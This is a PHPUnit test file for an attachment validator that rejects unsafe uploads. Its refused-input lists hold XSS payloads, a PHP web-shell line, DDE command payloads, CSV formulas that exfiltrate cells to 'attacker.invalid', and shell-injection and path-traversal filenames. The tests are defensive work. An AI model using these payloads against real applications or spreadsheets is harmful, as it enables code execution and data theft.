<?php

declare(strict_types=1);

namespace RivetCore\Tests\Unit\Panel;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use RivetCore\Panel\PanelAttachments;
use RivetCore\Panel\PanelLimits;
use RivetCore\Rmm\Http\ApiError;

final class PanelAttachmentsTest extends TestCase
{
    private const PNG = "\x89PNG\r\n\x1a\n\0\0\0\rIHDR";

    /** @return array{filename:string,content_type:string,data_base64:string} */
    private static function att(string $name, string $type, string $bytes): array
    {
        return ['filename' => $name, 'content_type' => $type, 'data_base64' => base64_encode($bytes)];
    }

    /** @param list<array<string,mixed>>|mixed $raw */
    private function rejected(mixed $raw, int $http = 422, string $code = 'attachment_rejected', ?PanelLimits $l = null): ApiError
    {
        try {
            PanelAttachments::validate($raw, $l ?? new PanelLimits());
        } catch (ApiError $e) {
            $this->assertSame([$http, $code], [$e->http, $e->errCode], $e->getMessage());

            return $e;
        }
        $this->fail('expected a rejection of ' . substr((string) json_encode($raw), 0, 120));
    }

    /** @return array<string,array{string,string,string}> */
    public static function accepted(): array
    {
        return [
            'png' => ['screen.png', 'image/png', self::PNG],
            'jpg' => ['photo.JPG', 'image/jpeg', "\xFF\xD8\xFF\xE0JFIF"],
            'jpeg alias type' => ['photo.jpeg', 'image/jpg', "\xFF\xD8\xFF\xE0JFIF"],
            'gif87' => ['a.gif', 'image/gif', 'GIF87a....'],
            'gif89' => ['a.gif', 'image/gif', 'GIF89a....'],
            'webp' => ['a.webp', 'image/webp', 'RIFF' . "\x10\0\0\0" . 'WEBPVP8 '],
            'pdf' => ['report.pdf', 'application/pdf', "%PDF-1.7\n%%EOF"],
            'txt with charset' => ['notes.txt', 'text/plain; charset=utf-8', "line one\nline two \u{00E9}\n"],
            'log' => ['app.log', 'text/plain', "2026-10-23 error: boom\r\n"],
            'csv as plain' => ['data.csv', 'text/plain', "a,b\n1,2\n"],
            'csv' => ['data.csv', 'TEXT/CSV', "a,b\n1,2\n"],
            'spaces and brackets' => ['My screenshot (1).png', 'image/png', self::PNG],
            // rc.38: things that look a little like a formula but are not at the start of a cell or are plain data
            'csv with negative numbers' => ['data.csv', 'text/csv', "name,delta\nbob,-5\nann,+3\n"],
            'csv with an equals inside a cell' => ['data.csv', 'text/csv', "a,b\nx=1,y=2\n"],
            'csv with a pipe in a cell' => ['data.csv', 'text/csv', "a,b\nfoo|bar,2\n"],
            'csv with an email' => ['data.csv', 'text/csv', "who,mail\nbob,bob@example.com\n"],
            'txt that mentions a script tag word' => ['a.txt', 'text/plain', 'the word script alone is fine'],
            'csv with quoted ordinary cells' => ['data.csv', 'text/csv', "name,note\n\"Smith, Bob\",\"said \"\"hi\"\"\"\n"],
            // CR6: ordinary logs and text that happen to contain angle brackets
            'mail log with an address' => ['mail.log', 'text/plain', "From: Bob Smith <bob@example.com>\nTo: <ann@example.org>\n"],
            'dir listing' => ['dir.txt', 'text/plain', "11/15/2026  10:00 AM    <DIR>          Documents\n"],
            'python traceback' => ['trace.log', 'text/plain', "Traceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n"],
            'java stack trace' => ['java.log', 'text/plain', "at java.util.ArrayList.<init>(ArrayList.java:1)\nat Foo.<clinit>(Foo.java:3)\n"],
            'txt starting with a quote' => ['quote.txt', 'text/plain', "\"- this is a quote\" she said\n"],
            'angle brackets around a level' => ['app.log', 'text/plain', "<info> started\n<error> src=foo failed\n"],
            'key=value log with quoted values and angle brackets (CRR-17)' => ['kv.log', 'text/plain', "ts=1 msg=\"a > b\" user=\"x\" level=<warn> host=h1 note='it''s fine'\n"],
            'a tag with thousands of quoted attributes and no handler (CRR-17)' => ['big.log', 'text/plain', '<x ' . str_repeat('k="v" ', 4000) . ">\n"],
            'many quoted pairs without a handler (CRR-17)' => ['many.log', 'text/plain', str_repeat('k="v" ', 4000) . "\n"],
            'txt that compares numbers' => ['a.txt', 'text/plain', 'if a < 3 and b > 2 then'],
            'txt with a bom' => ['a.txt', 'text/plain', "\xEF\xBB\xBFhello"],
            'name that merely contains a device name' => ['console.png', 'image/png', self::PNG],
            'name with a dash inside' => ['my-file.png', 'image/png', self::PNG],
        ];
    }

    #[DataProvider('accepted')]
    public function testAcceptsTheSupportedFormats(string $name, string $type, string $bytes): void
    {
        $out = PanelAttachments::validate([self::att($name, $type, $bytes)], new PanelLimits());
        $this->assertCount(1, $out);
        $this->assertSame($bytes, $out[0]['bytes']);
        $this->assertContains($out[0]['content_type'], ['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'application/pdf', 'text/plain', 'text/csv']);
        $this->assertMatchesRegularExpression('/^[A-Za-z0-9._\-() \[\]]+$/', $out[0]['filename']);
    }

    /** @return array<string,array{string,string,string}> */
    public static function refused(): array
    {
        return [
            'exe' => ['setup.exe', 'application/octet-stream', "MZ\x90\0"],
            'exe renamed png' => ['setup.png', 'image/png', "MZ\x90\0\x03"],
            'double extension' => ['report.exe.png', 'image/png', self::PNG],
            'double extension reversed' => ['report.png.exe', 'image/png', self::PNG],
            'script inside the name' => ['a.ps1.txt', 'text/plain', 'hello'],
            'bat' => ['run.bat', 'text/plain', 'echo hi'],
            'js' => ['x.js', 'text/plain', 'alert(1)'],
            'sh' => ['x.sh', 'text/plain', 'echo'],
            'svg' => ['x.svg', 'image/svg+xml', '<svg onload=alert(1)/>'],
            'html' => ['x.html', 'text/html', '<html>'],
            'zip' => ['x.zip', 'application/zip', "PK\x03\x04"],
            'docx' => ['x.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', "PK\x03\x04"],
            'no extension' => ['README', 'text/plain', 'hello'],
            'dot only' => ['.', 'text/plain', 'hello'],
            'hidden file' => ['.png', 'image/png', self::PNG],
            'type mismatch' => ['a.png', 'image/jpeg', self::PNG],
            'type text for image' => ['a.png', 'text/plain', self::PNG],
            'octet-stream' => ['a.png', 'application/octet-stream', self::PNG],
            'png magic missing' => ['a.png', 'image/png', 'not a png at all'],
            'jpeg magic missing' => ['a.jpg', 'image/jpeg', self::PNG],
            'gif magic missing' => ['a.gif', 'image/gif', 'GIF90a'],
            'webp magic missing' => ['a.webp', 'image/webp', 'RIFF....WAVE'],
            'pdf magic missing' => ['a.pdf', 'application/pdf', " %PDF-1.4"],
            'elf as text' => ['a.txt', 'text/plain', "\x7fELF\x02\x01"],
            'shebang as text' => ['a.txt', 'text/plain', "#!/bin/sh\necho hi"],
            'macho as log' => ['a.log', 'text/plain', "\xCF\xFA\xED\xFEabc"],
            'ole as pdf' => ['a.pdf', 'application/pdf', "\xD0\xCF\x11\xE0\xA1\xB1"],
            'nul in text' => ['a.txt', 'text/plain', "abc\0def"],
            'escape in text' => ['a.txt', 'text/plain', "abc\x1b[31mdef"],
            'invalid utf8 text' => ['a.txt', 'text/plain', "abc\xFF\xFEdef"],
            'html in text' => ['a.txt', 'text/plain', "intro\n<script>alert(1)</script>"],
            'php in csv' => ['a.csv', 'text/csv', '<?php system($_GET[1]);'],
            'doctype in log' => ['a.log', 'text/plain', '<!DOCTYPE html><title>x'],
            // rc.38 (security review RC36 L5)
            'csv formula' => ['a.csv', 'text/csv', "=cmd|' /C calc'!A0,2\n"],
            'csv plus formula' => ['a.csv', 'text/csv', "+cmd|' /C calc'!A0,2"],
            'csv minus formula' => ['a.csv', 'text/csv', '-2+3,x'],
            'csv at formula' => ['a.csv', 'text/csv', '@SUM(1+1)*cmd|x,1'],
            'csv leading tab' => ['a.csv', 'text/csv', "\t=1+1,x"],
            'csv leading carriage return' => ['a.csv', 'text/csv', "\r=1+1,x"],
            'csv formula after a bom' => ['a.csv', 'text/csv', "\xEF\xBB\xBF=1+1,x"],
            'txt starting with equals' => ['a.txt', 'text/plain', '=1+1'],
            'log starting with at' => ['a.log', 'text/plain', '@echo off'],
            'log starting with minus' => ['a.log', 'text/plain', '-- started'],
            'csv formula on a later line' => ['a.csv', 'text/csv', "name,value\n=HYPERLINK(\"http://evil\"),1"],
            'csv formula in a later cell' => ['a.csv', 'text/csv', "name,value\nbob,=1+1"],
            'csv dde on a later line' => ['a.csv', 'text/csv', "name,value\nbob,+cmd|' /C calc'!A0"],
            'script after the first 8 KiB' => ['a.txt', 'text/plain', str_repeat('x', 9000) . '<script>alert(1)</script>'],
            // CORE-DS-32: markup that is not on a name list
            'img onerror in text' => ['a.txt', 'text/plain', 'intro <img src=x onerror=alert(1)>'],
            'body onload in a log' => ['a.log', 'text/plain', '<body onload=alert(1)>'],
            'closing tag in text' => ['a.txt', 'text/plain', 'x </a> y'],
            'comment in csv' => ['a.csv', 'text/csv', "a,b\n<!-- x -->,2"],
            // CORE-DS-33: a quoted cell is the same formula to a spreadsheet
            'csv quoted hyperlink' => ['a.csv', 'text/csv', "name,value\nx,\"=HYPERLINK(\"\"http://attacker.example/?\"\"&A1,\"\"Click\"\")\"\n"],
            'csv quoted dde' => ['a.csv', 'text/csv', "name,value\nx,\"=cmd|' /C calc'!A0\"\n"],
            'csv quoted at function' => ['a.csv', 'text/csv', "a,\"@SUM(1+1)*cmd|x\"\n"],
            'csv quoted first cell' => ['a.csv', 'text/csv', "\"=1+1\",b\n"],
            'csv quoted plus call after spaces' => ['a.csv', 'text/csv', "a, \" +SUM(1,2)\"\n"],
            'img with a space after the name' => ['a.txt', 'text/plain', "x\n<IMG SRC=javascript:alert(1)>"],
            'slash separated handler' => ['a.txt', 'text/plain', '<x/onclick=alert(1)>'],
            'slash separated handler on a div' => ['a.log', 'text/plain', 'before <div/onmouseover=alert(1)> after'],
            'quoted greater-than before the handler (CRR-17)' => ['a.txt', 'text/plain', '<x title=">" onmouseover=alert(1)>'],
            'quoted less-than before the handler (CRR-17)' => ['a.txt', 'text/plain', '<x title="<" onclick=alert(1)>'],
            'single quoted value before the handler (CRR-17)' => ['a.txt', 'text/plain', "<x title='>' onfocus=alert(1)>"],
            'dot in the tag name (CRR-17)' => ['a.txt', 'text/plain', '<x.y onclick=alert(1)>'],
            'colon and digit in the tag name (CRR-17)' => ['a.txt', 'text/plain', '<svg:a1 onload=alert(1)>'],
            'rawtext element hides a handler: xmp (R6-1)' => ['a.txt', 'text/plain', '<xmp><x title="</xmp><y onclick=alert(1)>">'],
            'rawtext element hides a handler: xmp single quote (R6-1)' => ['a.txt', 'text/plain', "<xmp><x title='</xmp><y onclick=alert(1)>'>"],
            'rawtext element hides a handler: noembed (R6-1)' => ['a.txt', 'text/plain', '<noembed><x title="</noembed><y onclick=alert(1)>">'],
            'rawtext element hides a handler: noframes (R6-1)' => ['a.txt', 'text/plain', "<noframes><x title='</noframes><y onclick=alert(1)>'>"],
            'rawtext element hides a handler: plaintext (R6-1)' => ['a.txt', 'text/plain', '<plaintext><x title="<y onclick=alert(1)>">'],
            'rawtext element hides a handler: iframe (R6-1)' => ['a.txt', 'text/plain', '<iframe><x title="</iframe><y onclick=alert(1)>">'],
            'rawtext element hides a handler: noscript (R6-1)' => ['a.txt', 'text/plain', "<noscript><x title='</noscript><y onclick=alert(1)>'>"],
            'rawtext element hides a handler: textarea (R6-1)' => ['a.txt', 'text/plain', '<textarea><x title="</textarea><y onclick=alert(1)>">'],
            'rawtext element hides a handler: title (R6-1)' => ['a.txt', 'text/plain', '<title><x a="</title><y onclick=alert(1)>">'],
            'rawtext element hides a handler: style (R6-1)' => ['a.txt', 'text/plain', '<style><x a="</style><y onclick=alert(1)>">'],
            'rawtext element hides a handler: script (R6-1)' => ['a.txt', 'text/plain', '<script><x a="</script><y onclick=alert(1)>">'],
            'tag start inside a quoted value (R5-1 review)' => ['a.txt', 'text/plain', '<x title="<b onclick=1>'],
            'tag inside a closed quoted value (R5-1 review)' => ['a.txt', 'text/plain', '<x b="1<img onerror=x>">'],
            'tag inside a single quoted value (R5-1 review)' => ['a.txt', 'text/plain', "<x b='1<svg onload=x>'>"],
            'unterminated quote then a handler (R5-1 review)' => ['a.txt', 'text/plain', '<x a="b onclick=1>'],
            'unterminated single quote then a handler (R5-1 review)' => ['a.txt', 'text/plain', "<x a='b onclick=1>"],
            'unterminated quote with a later tag (R5-1 review)' => ['a.txt', 'text/plain', "<x a=\"b\n<y onclick=1>"],
            'space after the bracket, handler (R5-1 review)' => ['a.txt', 'text/plain', '< x onclick=1>'],
            'less-than then a digit inside the tag (R5-1)' => ['a.txt', 'text/plain', '<x <1 onclick=1>'],
            'less-than inside an attribute name (R5-1)' => ['a.txt', 'text/plain', '<x a<1 onclick=1>'],
            'less-than glued to the tag name (R5-1)' => ['a.txt', 'text/plain', '<x<y onclick=1>'],
            'quote in the tag name (CRR-17)' => ['a.txt', 'text/plain', '<x"y onclick=alert(1)>'],
            'apostrophe in the tag name (CRR-17)' => ['a.txt', 'text/plain', "<x'y onclick=alert(1)>"],
            'equals sign in the tag name (CRR-17)' => ['a.txt', 'text/plain', '<x=y onclick=alert(1)>'],
            'stray apostrophe in an unquoted value (CRR-17)' => ['a.txt', 'text/plain', "<x data=it's onclick=alert(1)>"],
            'stray quote in an attribute name (CRR-17)' => ['a.txt', 'text/plain', '<x a"b onclick=alert(1)>'],
            'quote that closes after the handler (CRR-17)' => ['a.txt', 'text/plain', "<x a=b onclick=alert(1) c='d'>"],
            'earlier regression: slash then handler' => ['a.txt', 'text/plain', '<img/src=x onerror=alert(1)>'],
            'earlier regression: newline separator' => ['a.txt', 'text/plain', "<x\nonclick=alert(1)>"],
            'earlier regression: handler after other attributes' => ['a.txt', 'text/plain', '<x class=a id=b onfocus=alert(1) autofocus>'],
            'earlier regression: href with a space before the colon-free name' => ['a.txt', 'text/plain', '<x data-a=1 href=javascript:alert(1)>'],
            'earlier regression: uppercase' => ['a.txt', 'text/plain', '<X ONCLICK=alert(1)>'],
            'earlier regression: space after the bracket' => ['a.txt', 'text/plain', '< x onclick=alert(1)>'],
            'tab separated (CRR-17)' => ['a.txt', 'text/plain', "<x\tonclick=alert(1)>"],
            'slash then spaces then handler' => ['a.txt', 'text/plain', '<foo / onfocus=alert(1) autofocus>'],
            'quoted attribute after a slash' => ['a.txt', 'text/plain', '<p/style="x:expression(alert(1))">'],
            'svg onload' => ['a.log', 'text/plain', '<svg/onload=alert(1)>'],
            'anchor with href' => ['a.txt', 'text/plain', 'see <a href="javascript:alert(1)">here</a>'],
            'unknown tag with a handler' => ['a.txt', 'text/plain', '<x-foo onclick=alert(1)>'],
            'device name' => ['CON.png', 'image/png', self::PNG],
            'device name lower case with extension' => ['nul.txt', 'text/plain', 'hello'],
            'device name with spaces before the dot' => ['con .txt', 'text/plain', 'hello'],
            'device name with several spaces and dots' => ['NUL . .txt', 'text/plain', 'hello'],
            'com port' => ['com1.log', 'text/plain', 'hello'],
            'lpt' => ['LPT9.png', 'image/png', self::PNG],
            'leading dash' => ['-rf.png', 'image/png', self::PNG],
        ];
    }

    #[DataProvider('refused')]
    public function testRefuses(string $name, string $type, string $bytes): void
    {
        $this->rejected([self::att($name, $type, $bytes)]);
    }

    /**
     * R5-1 / R6-2: the scan for active attributes is linear in the size of the file and bounded by a step budget. Adversarial files of the largest default size (5 MiB) in several shapes
     * are decided, and the verdict of each is asserted. The time bound is generous on purpose (a CI runner is several times slower than a workstation): the quadratic version needed minutes for a tenth of this size, so a bound of seconds still catches it, and what the test pins down is the verdict and the step budget. Every input starts with a `href=` that is not in a tag, so the prefilter lets it through and the
     * tokenizer really runs (a file without any candidate attribute name never reaches it).
     *
     * @return array<string,array{string,bool}> bytes, whether the file is refused
     */
    public static function adversarial(): array
    {
        $size = 5 * 1024 * 1024 - 64;
        $fill = static fn (string $unit): string => "href=1\n" . substr(str_repeat($unit, intdiv($size, strlen($unit)) + 1), 0, $size);

        return [
            // more markup than the budget allows: refused
            'repeated unterminated tags' => [$fill('<x a=b'), true],
            'repeated unterminated tags with a space' => [$fill('<x a=b '), true],
            'candidate attribute names, no handler value' => [$fill('<x data-src b '), true],
            'candidate names with quoted values' => [$fill('<x srcset="a" b=c '), true],
            'handler-like names that are not attributes' => [$fill('<x a=b onx'), true],
            'quote led' => [$fill('<x "a=b '), true],
            'less-than inside the tag' => [$fill('<x <1 '), true],
            'closed quotes without a handler' => [$fill('<x a="b" '), true],
            'equals signs' => [$fill('<x ='), true],
            'slashes' => [$fill('<x /'), true],
            'a handler at the very end' => [$fill('<x a=b ') . '<x onclick=1>', true],
            // refused because a quote is never closed
            'unterminated quotes' => [$fill('<x a="'), true],
            'unterminated single quotes' => [$fill("<x a='"), true],
            // little markup: decided on what it says (accepted)
            'tag names without white space' => [$fill('<x'), false],
            'less-than runs' => [$fill('<'), false],
            'less-than and spaces' => [$fill('<   '), false],
            'long attribute name' => ["href=1\n<x " . str_repeat('a', $size - 10) . '=1>', false],
        ];
    }

    #[DataProvider('adversarial')]
    public function testTheActiveMarkupScanIsLinearAndDecidesEachShape(string $bytes, bool $refused): void
    {
        $scan = new \ReflectionMethod(PanelAttachments::class, 'hasActiveAttribute');
        $t = hrtime(true);
        $verdict = $scan->invoke(null, $bytes);
        $ms = (hrtime(true) - $t) / 1e6;
        $this->assertSame($refused, $verdict, 'the tokenizer verdict');
        $this->assertLessThan(20000, $ms, 'took ' . round($ms) . ' ms for ' . strlen($bytes) . ' bytes');
        // and through the whole validation: the same verdict, in the same time
        $t = hrtime(true);
        $threw = false;
        try {
            PanelAttachments::validate([self::att('big.txt', 'text/plain', $bytes)], new PanelLimits());
        } catch (ApiError) {
            $threw = true;
        }
        $this->assertSame($refused, $threw, 'validate() agrees');
        $this->assertLessThan(20000, (hrtime(true) - $t) / 1e6);
    }

    /** R6-2: running out of the step budget refuses the file (it cannot happen by accident at the real budget; a small one is injected to reach the branch). */
    public function testRunningOutOfTheStepBudgetRefusesTheFile(): void
    {
        $scan = new \ReflectionMethod(PanelAttachments::class, 'hasActiveAttribute');
        $text = "href=1\n" . str_repeat('<x b=c ', 50);
        $this->assertFalse($scan->invoke(null, $text), 'at the real budget: fifty harmless tags are fine');
        $this->assertTrue($scan->invoke(null, $text, 5), 'with a budget of five steps the scan gives up and refuses');
        $this->assertFalse($scan->invoke(null, "href=1\n<x b=c>", 5), 'a budget that is enough does not');
    }

    public function testShapeErrors(): void
    {
        foreach ([[['filename' => 'a.png']], [['filename' => 'a.png', 'content_type' => 'image/png', 'data_base64' => 5]], ['x'], [5], ['filename' => 'a.png'], 'str', 7] as $raw) {
            $this->rejected($raw);
        }
        $this->rejected([self::att('a.png', 'image/png', self::PNG) + [], ['filename' => 'b.png', 'content_type' => 'image/png', 'data_base64' => '%%%not base64%%%']]);
        $this->rejected([['filename' => 'a.png', 'content_type' => 'image/png', 'data_base64' => '']]);
        $this->assertSame([], PanelAttachments::validate(null, new PanelLimits()));
        $this->assertSame([], PanelAttachments::validate([], new PanelLimits()));
    }

    public function testCountAndSizeLimits(): void
    {
        $one = self::att('a.png', 'image/png', self::PNG);
        $this->rejected([$one, $one, $one, $one]);
        $l = new PanelLimits(attachmentBytesMax: 1024, attachmentsTotalMax: 1500);
        $big = self::att('big.png', 'image/png', self::PNG . str_repeat("\0", 2000));
        $this->rejected([$big], 413, 'too_large', $l);
        $just = self::att('ok.png', 'image/png', self::PNG . str_repeat("\0", 1024 - strlen(self::PNG)));
        $this->assertCount(1, PanelAttachments::validate([$just], $l));
        $this->rejected([$just, $just], 413, 'too_large', $l);
        // a value that is far over the cap is refused on its length alone, without decoding it
        $huge = ['filename' => 'h.png', 'content_type' => 'image/png', 'data_base64' => str_repeat('A', 50000)];
        $this->rejected([$huge], 413, 'too_large', $l);
        $this->assertCount(0, PanelAttachments::validate([], $l));
        $none = new PanelLimits(attachmentsMax: 0);
        $this->rejected([$one], 422, 'attachment_rejected', $none);
    }

    public function testTheConfiguredExtensionListCanOnlyNarrowTheBuiltInTable(): void
    {
        $l = PanelLimits::fromArray(['allowedExtensions' => ['PNG', '.exe', 'docx', 'bad ext', 5]]);
        $this->assertSame(['png', 'exe', 'docx'], $l->allowedExtensions);
        $this->assertCount(1, PanelAttachments::validate([self::att('a.png', 'image/png', self::PNG)], $l));
        $this->rejected([self::att('a.pdf', 'application/pdf', '%PDF-1')], 422, 'attachment_rejected', $l);
        $this->rejected([self::att('a.exe', 'application/octet-stream', 'MZ..')], 422, 'attachment_rejected', $l);
        $this->rejected([self::att('a.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', "PK\x03\x04")], 422, 'attachment_rejected', $l);
    }

    /** @return array<string,array{string,string}> */
    public static function names(): array
    {
        return [
            'path traversal' => ['../../etc/passwd.txt', 'passwd.txt'],
            'windows path' => ['C:\\Users\\x\\a.txt', 'a.txt'],
            'bidi in name' => ["a\u{202E}gnp.txt", 'agnp.txt'],
            'controls' => ["a\x00b\x07.txt", 'ab.txt'],
            'shell characters' => ['a;rm -rf *$(x)`y`.txt', 'a_rm -rf _(x)_y_.txt'],
            'quotes and newline' => ["a\"b'\n.txt", 'a_b_ .txt'],
            'leading dots' => ['...hidden.txt', 'hidden.txt'],
            'unicode letters' => ["r\u{00E9}sum\u{00E9}.txt", 'r_sum_.txt'],
        ];
    }

    #[DataProvider('names')]
    public function testFilenamesAreSanitisedBasenames(string $given, string $expected): void
    {
        $got = PanelAttachments::filename($given);
        $this->assertSame($expected, $got);
        $this->assertStringNotContainsString('/', $got);
        $this->assertStringNotContainsString('\\', $got);
        $this->assertStringNotContainsString('..', $got);
    }

    public function testLongNamesAreShortenedKeepingTheExtensionAndDuplicatesAreMadeUnique(): void
    {
        $long = PanelAttachments::filename(str_repeat('n', 300) . '.txt');
        $this->assertLessThanOrEqual(100, strlen($long));
        $this->assertStringEndsWith('.txt', $long);
        $out = PanelAttachments::validate([self::att('a.png', 'image/png', self::PNG), self::att('A.png', 'image/png', self::PNG)], new PanelLimits());
        $this->assertNotSame(strtolower($out[0]['filename']), strtolower($out[1]['filename']));
    }

    /**
     * CORE-DS-33 reopened by CORE-API-1 / CORE-DATA-1 (red team 2026-11-21) and closed: every cell of a CSV, in every reading a spreadsheet may make of it, is refused when it
     * starts with = + - @ tab or a line break unless the whole cell is a plain number. The first group are the exact payloads of both proofs of concept
     * (core-api/poc_csv_formula_bypass.php, core-data/poc_core_data_1_csv_formula.php), all of which the previous check accepted except the controls.
     *
     * @return array<string,array{string,bool}> bytes, whether the file is refused
     */
    public static function csvFormulaCells(): array
    {
        $long = str_repeat('1+', 50);

        return [
            // core-api/poc_csv_formula_bypass.php
            'core-api a: =1+1 on a later line (control)' => ["name,qty\nx,1\n=1+1\n", true],
            'core-api b: minus DDE with the pipe after 80 characters' => ["name,qty\nx,-1+" . $long . "cmd|' /C calc'!A0\n", true],
            'core-api c: quoted plus DDE with the pipe after 80 characters' => ["name,qty\nx,\"+1+" . $long . "cmd|' /C calc'!A0\"\n", true],
            'core-api d: minus arithmetic' => ["name,qty\nx,-2+3\n", true],
            'core-api e: at DDE with the pipe after 80 characters' => ["name,qty\nx,@" . $long . "cmd|' /C calc'!A0\n", true],
            'core-api f: formula after a NEL line break' => ["name,qty\nx,y\n\xc2\x85=1+1\n", true],
            // core-data/poc_core_data_1_csv_formula.php
            'core-data control: =1+1 second line' => ["name,qty\nwidget,=1+1\n", true],
            'core-data control: +cmd| within 80' => ["name,qty\nwidget,+cmd|' /C calc'!A0\n", true],
            'core-data control: +HYPERLINK(' => ["name,qty\nwidget,+HYPERLINK(\"http://x\",\"y\")\n", true],
            'core-data bypass: +1+HYPERLINK(' => ["name,qty\nwidget,+1+HYPERLINK(\"http://attacker.invalid/?\"&A1,\"click\")\n", true],
            'core-data bypass: -1+WEBSERVICE(' => ["name,qty\nwidget,-1+WEBSERVICE(\"http://attacker.invalid/\"&A1)\n", true],
            'core-data bypass: @1+IMPORTXML(' => ["name,qty\nwidget,@1+IMPORTXML(\"http://attacker.invalid/\"&A1,\"//a\")\n", true],
            'core-data bypass: DDE with the pipe after 80 characters' => ["name,qty\nwidget,+" . str_repeat('1+', 45) . "cmd|' /C calc'!A0\n", true],
            // the readings disagree about a quote: each one must pass on its own
            'comma reader sees a cell the semicolon quote hides' => ["a;\"b,=1+1,c\"\n", true],
            'tab reader sees a cell the comma quote hides' => ["a,\"b\t=1+1\"\n", true],
            'semicolon reader sees a line of a multi-line cell as a row' => ["id,note\n1,\"first line\n=1+1;x\"\n", true],
            'a reader with every separator sees a cell the others do not' => ["x,\"a;\"b;=1+1\"\n", true],
            'sep= names a separator no default reading uses' => ["sep=|\na|=1+1\n", true],
            'sep= names a multi-byte separator' => ["sep=\u{00A7}\na\u{00A7}b\n", true],
            'quoted cell never closed' => ["a,\"b\n=1+1\n", true],
            // where the formula character hides
            'text after the closing quote is part of the cell' => ["a,\"-5\"+1\n", true],
            'space then a quote then the formula' => ["a, \"=1+1\"\n", true],
            'no-break space before the formula' => ["a,\u{00A0}=1+1\n", true],
            'zero width space before the formula' => ["a,\u{200B}+1+1\n", true],
            'escaped quote then the formula' => ["a,\"\"\"=1+1\"\"\"\n", true],
            'quoted cell that starts with a tab' => ["a,\"\t=1+1\"\n", true],
            'quoted cell that starts with a carriage return' => ["a,\"\r=1+1\"\n", true],
            'formula after a lone carriage return' => ["a,b\r=1+1\r", true],
            'formula in the first cell' => ["=1+1,b\n", true],
            'formula in the first cell after a bom' => ["\xEF\xBB\xBF-1+1,b\n", true],
            // refused on purpose although not an attack (docs/panel/PANEL_API.md)
            'dash item cell' => ["task,note\n1,- item\n", true],
            'double dash note cell' => ["task,note\n1,-- note\n", true],
            'phone number with a plus, brackets and dashes' => ["who,phone\nbob,+1 (555) 123-4567\n", true],
            'handle with an at sign' => ["who,handle\nbob,@bob\n", true],
            'signed first cell of a comma row' => ["-5,apples\n", true],
            'cell that starts with a tab in the comma reading' => ["a,\tb\n", true],
            // legitimate files that must stay accepted
            'negative and positive numbers' => ["name,delta\nbob,-5\nann,+3\ncid,-12.5\n", false],
            'exponents' => ["name,value\nx,1e5\ny,-1.5e-3\nz,+2E10\n", false],
            'decimal comma in a semicolon file' => ["name;delta\nbob;+1,5\nann;-1,5\n", false],
            'quoted thousands separators' => ["name,amount\nbob,\"-1,234.56\"\nann,\"+1.234,56\"\n", false],
            'percent' => ["name,change\nbob,-5%\nann,+3.5 %\n", false],
            'phone number of digits and spaces only (inert)' => ["who,phone\nbob,+44 20 7946 0958\n", false],
            'a file that is one plain negative number per line' => ["-5\n+3\n-12.5\n", false],
            'a lone dash as a placeholder' => ["name,value,note\nbob,-,x\nann,--,y\n", false],
            'quoted commas' => ["name,note\nx,\"Smith, Bob\"\ny,\"a, -b, +c\"\n", false],
            'multi-line quoted cell' => ["id,note\n1,\"line one\nline two\r\nline three\"\n", false],
            'multi-line quoted first cell with a dash item' => ["\"line one\n- item two\n- item three\",1\n", false],
            'quoted cell that contains an escaped formula in the middle' => ["a,\"said \"\"=1+1\"\" loudly\"\n", false],
            'equals and pipe inside a cell' => ["a,b\nx=1,y|z\n", false],
            'tab separated with numbers' => ["a\tb\n1\t-5\n", false],
            'crlf line ends and empty cells' => ["a,b,c\r\n,,\r\n1,,-2\r\n", false],
            'dates and times' => ["when,what\n2026-11-21,ok\n2026-11-21T10:00:00-05:00,ok\n", false],
            'non-ascii first letters' => ["name,city\n\u{00C9}mile,Z\u{00FC}rich\n\u{5317}\u{4EAC},x\n", false],
            'sep= line naming the comma' => ["sep=,\na,-5\n", false],
        ];
    }

    #[DataProvider('csvFormulaCells')]
    public function testEveryCsvCellIsCheckedForAFormulaQuoteAwareInEveryReading(string $bytes, bool $refused): void
    {
        $threw = false;
        try {
            PanelAttachments::validate([self::att('report.csv', 'text/csv', $bytes)], new PanelLimits());
        } catch (ApiError $e) {
            $threw = true;
            $this->assertSame([422, 'attachment_rejected'], [$e->http, $e->errCode]);
        }
        $this->assertSame($refused, $threw, ($refused ? 'should be refused: ' : 'should be accepted: ') . json_encode($bytes));
    }

    /**
     * The CSV reading is linear: adversarial files of the largest default size (5 MiB) are decided in bounded time, both the shapes the regex tokenizer consumes in bulk
     * (signed numbers, quoted cells, separators, runs of quotes, non-ASCII text) and the shapes that need PHP one cell at a time, which the step budget refuses. The bound is
     * generous for a CI runner, as in the markup scan test above (measured: under half a second each on a workstation).
     *
     * @return array<string,array{string,bool}>
     */
    public static function adversarialCsv(): array
    {
        $size = 5 * 1024 * 1024 - 64;
        $fill = static fn (string $unit): string => "a,b\n" . str_repeat($unit, intdiv($size, strlen($unit)));

        return [
            'signed numbers' => [$fill("x,-5,+3\n"), false],
            'quoted empty cells' => [$fill('"",'), false],
            'quoted cells with escaped quotes' => [$fill('"a""b",'), false],
            'quoted cells with separators inside' => [$fill('"a,b;c",'), false],
            'quoted numbers with group separators' => [$fill("x,\"-1,234.56\"\n"), false],
            'separators only' => [$fill(',;'), false],
            'tab separated empty cells' => [$fill("x\t\t"), false],
            'spaces only' => [$fill(' '), false],
            'one long quoted cell' => ['"' . str_repeat('a""', intdiv($size, 3)) . '"', false],
            'one long run of quotes' => ['x,"' . str_repeat('""', intdiv($size, 2) - 4) . '"', false],
            'lone dashes' => [$fill("x,-\n"), false],
            'tab-only cells in the semicolon reading' => [$fill(";\t"), false],
            'cjk text' => [$fill("\u{5317}\u{4EAC},"), false],
            'typographic quotes' => [$fill("\u{201C}a\u{201D},"), false],
            'formula at the very end' => [$fill("x,-5\n") . "\n=1+1", true],
            'never closed quote at the very end' => [$fill('x,"a",') . '"never closed', true],
            // every cell needs PHP: the step budget refuses the file
            'quoted cells that start with an escaped quote' => [$fill('"""a""",'), true],
            'cells that start with a no-break space' => [$fill("\xC2\xA0a,"), true],
            'quoted cells with more quote pairs than the tokenizer takes' => [$fill('"a""b""c""d""e""f""g""h""i""j",'), true],
        ];
    }

    #[DataProvider('adversarialCsv')]
    public function testTheCsvReadingIsLinear(string $bytes, bool $refused): void
    {
        $t = hrtime(true);
        $threw = false;
        try {
